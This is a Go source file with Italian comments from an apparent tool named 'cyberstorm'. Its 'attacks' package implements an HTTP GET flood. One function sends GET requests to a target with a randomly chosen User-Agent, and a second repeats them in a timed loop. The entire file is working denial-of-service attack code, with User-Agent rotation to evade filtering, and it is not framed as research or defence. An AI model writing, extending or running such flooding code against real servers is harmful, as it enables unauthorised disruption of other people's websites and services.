package attacks

import (
	"fmt"
	"math/rand"
	"net/http"
	"time"
	"cyberstorm/core" // Importa la lista di User-Agent
)

// SendHTTPGet invia una singola richiesta HTTP GET al server target con un User-Agent randomico.
func SendHTTPGet(dstUrl, userAgent string) error {
	// Se il parametro userAgent è vuoto, selezioniamo uno randomico
	if userAgent == "" {
		userAgent = core.UserAgents[rand.Intn(len(core.UserAgents))]
	}

	req, err := http.NewRequest("GET", dstUrl, nil)
	if err != nil {
		return fmt.Errorf("HTTP GET request failed: %w", err)
	}

	// Imposta il campo User-Agent nell'header
	req.Header.Set("User-Agent", userAgent)

	client := &http.Client{Timeout: time.Second * 10}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("HTTP GET request failed: %w", err)
	}
	defer resp.Body.Close()

	return nil
}

// RunHTTPGetFlood esegue un flood HTTP GET verso il target.
func RunHTTPGetFlood(url, userAgent string, duration time.Duration) {
	endTime := time.Now().Add(duration)
	for time.Now().Before(endTime) {
		err := SendHTTPGet(url, userAgent)
		if err != nil {
			fmt.Println("HTTP GET request failed:", err)
		}
		// Aggiungi una pausa per evitare sovraccarico della CPU
		time.Sleep(time.Millisecond * 100) // Regola la frequenza delle richieste
	}
}
